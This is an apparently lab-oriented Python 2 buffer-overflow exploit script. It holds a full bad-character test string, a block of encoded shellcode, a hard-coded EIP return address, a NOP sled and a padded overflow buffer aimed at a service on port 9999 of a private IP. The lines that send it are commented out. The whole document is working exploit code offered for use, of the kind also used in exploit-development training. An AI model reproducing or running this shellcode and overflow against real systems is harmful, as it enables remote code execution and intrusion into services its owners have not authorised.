import socket

try:
  print "\nSending evil buffer..."
  badchar= ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
  buf =  b""
  buf += b"\xbb\x8e\x9f\x43\x39\xd9\xe5\xd9\x74\x24\xf4\x58\x29"
  buf += b"\xc9\xb1\x56\x83\xc0\x04\x31\x58\x0f\x03\x58\x81\x7d"
  buf += b"\xb6\xc5\x75\x03\x39\x36\x85\x64\xb3\xd3\xb4\xa4\xa7"
  buf += b"\x90\xe6\x14\xa3\xf5\x0a\xde\xe1\xed\x99\x92\x2d\x01"
  buf += b"\x2a\x18\x08\x2c\xab\x31\x68\x2f\x2f\x48\xbd\x8f\x0e"
  buf += b"\x83\xb0\xce\x57\xfe\x39\x82\x00\x74\xef\x33\x25\xc0"
  buf += b"\x2c\xbf\x75\xc4\x34\x5c\xcd\xe7\x15\xf3\x46\xbe\xb5"
  buf += b"\xf5\x8b\xca\xff\xed\xc8\xf7\xb6\x86\x3a\x83\x48\x4f"
  buf += b"\x73\x6c\xe6\xae\xbc\x9f\xf6\xf7\x7a\x40\x8d\x01\x79"
  buf += b"\xfd\x96\xd5\x00\xd9\x13\xce\xa2\xaa\x84\x2a\x53\x7e"
  buf += b"\x52\xb8\x5f\xcb\x10\xe6\x43\xca\xf5\x9c\x7f\x47\xf8"
  buf += b"\x72\xf6\x13\xdf\x56\x53\xc7\x7e\xce\x39\xa6\x7f\x10"
  buf += b"\xe2\x17\xda\x5a\x0e\x43\x57\x01\x46\xa0\x5a\xba\x96"
  buf += b"\xae\xed\xc9\xa4\x71\x46\x46\x84\xfa\x40\x91\x9d\xed"
  buf += b"\x72\x4d\x25\x7d\x8d\x6e\x55\x57\x4a\x3a\x05\xcf\x7b"
  buf += b"\x43\xce\x0f\x83\x96\x7a\x1a\x13\xd9\xd2\xa9\x71\xb1"
  buf += b"\x20\xce\x74\xf9\xad\x28\x26\xad\xfd\xe4\x87\x1d\xbd"
  buf += b"\x54\x60\x74\x32\x8a\x90\x77\x99\xa3\x3b\x98\x77\x9b"
  buf += b"\xd3\x01\xd2\x57\x45\xcd\xc9\x1d\x45\x45\xfb\xe2\x08"
  buf += b"\xae\x8e\xf0\x7d\xc9\x70\x09\x7e\x7c\x70\x63\x7a\xd6"
  buf += b"\x27\x1b\x80\x0f\x0f\x84\x7b\x7a\x0c\xc3\x84\xfb\x24"
  buf += b"\xbf\xb3\x69\x08\xd7\xbb\x7d\x88\x27\xea\x17\x88\x4f"
  buf += b"\x4a\x4c\xdb\x6a\x95\x59\x48\x27\x00\x62\x38\x9b\x83"
  buf += b"\x0a\xc6\xc2\xe4\x94\x39\x21\x77\xd2\xc5\xb7\x50\x7b"
  buf += b"\xad\x47\xe1\x7b\x2d\x22\xe1\x2b\x45\xb9\xce\xc4\xa5"
  buf += b"\x42\xc5\x8c\xad\xc9\x88\x7f\x4c\xcd\x80\xde\xd0\xce"
  buf += b"\x27\xfb\xe3\xb5\x48\xfc\x04\x4a\x41\x99\x05\x4a\x6d"
  buf += b"\x9f\x3a\x9c\x54\xd5\x7d\x1c\xe3\xe6\xc8\x01\x42\x6d"
  buf += b"\x32\x15\x94\xa4"

  eip = "\xf3\x12\x17\x31"
  nops="\x90"*10
  print (len(buf))
  print (eip)
  print(nops)

  buffer = "A"*254+eip+nops+buf+"c"*(1003-10-524-4-len(buf))
 
  #s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  #s.connect(("192.168.179.147", 9999))
  #s.send(buffer)
  
  #s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"
